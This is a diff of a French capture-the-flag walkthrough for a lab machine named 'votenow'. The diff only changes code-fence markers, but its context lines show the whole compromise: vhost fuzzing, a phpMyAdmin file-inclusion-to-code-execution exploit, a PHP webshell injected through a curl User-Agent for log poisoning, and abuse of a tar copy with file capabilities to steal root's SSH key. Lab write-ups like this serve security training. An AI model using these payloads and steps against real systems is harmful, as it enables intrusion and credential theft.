@@ -23,7 +23,7 @@ Le synopsis est le suivant :
 Premier tour
 ------------
 
-```plain
+```
 Nmap scan report for 192.168.56.119
 Host is up (0.00014s latency).
 Not shown: 65533 closed tcp ports (reset)
@@ -42,7 +42,7 @@ PORT     STATE SERVICE VERSION
 
 J'ai lancé [Nuclei](https://nuclei.projectdiscovery.io/) sur le site qui a rapidement trouvé un fichier de backup :  
 
-```plain
+```
 [2021-12-23 12:15:56] [php-backup-files] [http] [medium] http://192.168.56.119/config.php.bak
 ```
 
@@ -63,7 +63,7 @@ Sur la page d'accueil on trouve différents noms ainsi que dans la page *about.h
 
 J'en ait fait la wordlist suivante en imaginant des logins associés :  
 
-```plain
+```
 kelly
 bowen
 hugh
@@ -89,7 +89,7 @@ Vu que l'énumération web ne ramenait rien j'ai tenté de bruteforcer (rapideme
 
 A noter qu'à chaque fois on obtenait une erreur de ce type :  
 
-```plain
+```
 votebox@192.168.56.119: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
 ```
 
@@ -97,7 +97,7 @@ Le login par mot de passe a sans doute été désactivé globalement.
 
 Comme on peut voir un domaine *votenow.local* dans le code HTML j'ai procédé à des énumérations des hôtes virtuels. Finalement avec une des wordlists quelque chose est ressorti.  
 
-```plain
+```
 $ ffuf -w fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt -u http://192.168.56.119/ -H "Host: FUZZ.votenow.local" -fs 11713
 
         /'___\  /'___\           /'___\       
@@ -132,7 +132,7 @@ Dans une table *users* on trouve un hash bcrypt (misère) d'un certain *admin*. 
 
 Notre utilisateur SQL *votebox* ne dispose pas du privilège *FILE* qui aurait pu nous permettre de poser un webshell sur la machine.  
 
-```plain
+```
 show grants;
 
 GRANT USAGE ON *.* TO 'votebox'@'%' IDENTIFIED BY PASSWORD '*F8DCB98DA2D0C94434F0A37BFA19CDAB5F1BC5ED'	
@@ -150,7 +150,7 @@ La vulnérabilité nécessite d'être authentifié et ça tombe bien vu que c'es
 
 L'exploit pour obtenir la RCE poste une requête du type  
 
-```plain
+```
 select 'php system($_GET[&quot;cmd&quot;]); ?';
 ```
 
@@ -160,7 +160,7 @@ L'idée c'est que la requête SQL est stockée dans la session qui est ensuite i
 
 On a donc une requête qui ressemble à ça :  
 
-```plain
+```
 http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../var/lib/php/sessions/sess_bitno6d2hc3k0vp7dr05turs0o5s3c4k
 ```
 
@@ -187,7 +187,7 @@ with open("/opt/hdd/downloads/tools/wordlists/files/LFI-LFISuite-pathtotest.txt"
 
 J'avais des outputs de ce type :  
 
-```plain
+```
 File /proc/self/cmdline is readable
 /usr/sbin/httpd-DFO
 
@@ -210,13 +210,13 @@ PMA_token |s:16:"(lX
 
 */proc/self/environ* n'est malheureusement pas accessible mais sur */proc/self/fd/6* on a les logs HTTP avec des entrées de ce type :  
 
-```plain
+```
 192.168.56.1 - - [26/Dec/2021:12:52:55 +0000] "GET /index.php HTTP/1.1" 200 11414 "-" "python-requests/2.25.1"
 ```
 
 Dans la logique il n'y a qu'à faire une requête avec un User-Agent spécial puis réinclure le fichier :  
 
-```plain
+```
 curl -A '<?php system($_GET["cmd"]); ?>' http://datasafe.votenow.local/
 ```
 
@@ -234,7 +234,7 @@ Finalement le titre de l'interface web est un bon candidat :
 
 Le texte est bien présent :  
 
-```plain
+```
 --- snip ---
 userconfig|a:2:{s:2:"db";a:3:{s:12:"Console/Mode";s:8:"collapse";s:12:"TitleDefault";s:12:"<thisisdope>";s:14:"Server/hide_db";s:0:"";}s:2:"ts";i:1640526301;}
 --- snip ---
@@ -250,7 +250,7 @@ Ce qui me permettra aussi de retrouver facilement mon output.
 
 Cette fois ça fonctionne bien si on passe *id; uname -a* au paramètre *c* :  
 
-```plain
+```
 dv_startuid=48(apache) gid=48(apache) groups=48(apache)
 Linux votenow.local 3.10.0-1127.13.1.el7.x86_64 #1 SMP Tue Jun 23 15:46:38 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 dv_end
@@ -263,7 +263,7 @@ Premier réflexe après ces difficultés : écrire un shell.php à la racine du 
 
 LinPEAS me remonte pas mal d'exploits possibles : dirtycow, sudo Baron Samedit, RationalLove, overlayfs ainsi que ceux-ci :  
 
-```plain
+```
 
   [1] exploit_x
       CVE-2018-14665
@@ -278,7 +278,7 @@ LinPEAS me remonte pas mal d'exploits possibles : dirtycow, sudo Baron Samedit, 
 
 Mais avant d'en arriver là j'ai remarqué une entrée étrange dans la liste des binaires avec des capabilities :  
 
-```plain
+```
 Files with capabilities (limited to 50):
 /usr/bin/newgidmap = cap_setgid+ep
 /usr/bin/newuidmap = cap_setuid+ep
@@ -291,7 +291,7 @@ Files with capabilities (limited to 50):
 
 Ce *tarS* a un nom bizarre. Est-ce une copie de la commande *tar* ? Plus de doute sur son rôle quand on voit le propriétaire du binaire :  
 
-```plain
+```
 -rwx------. 1 admin admin 346136 Jun 27  2020 /usr/bin/tarS
 ```
 
@@ -303,7 +303,7 @@ Il nous faut être *admin* pour utiliser le programme, ça tombe bien le hash ca
 
 On trouve deux fichiers texte une fois connecté :  
 
-```plain
+```
 [admin@votenow ~]$ cat user.txt 
 663ba6a402a57536772c6118e8181570
 [admin@votenow ~]$ cat notes.txt 
@@ -322,7 +322,7 @@ tarS cz /root > root.tar.gz
 
 On y trouve entre autres les fichiers suivants :  
 
-```plain
+```
 root/root-final-flag.txt
 root/.ssh/
 root/.ssh/id_rsa
@@ -332,7 +332,7 @@ root/.ssh/authorized_keys
 
 Aucun mot de passe n'étant attaché à la clé privée on peut donc se connecter :  
 
-```plain
+```
 [admin@votenow ~]$ ssh -p 2082 -i root/.ssh/id_rsa root@127.0.0.1
 Last login: Sun Jun 28 00:42:56 2020 from 192.168.56.1
 [root@votenow ~]# id
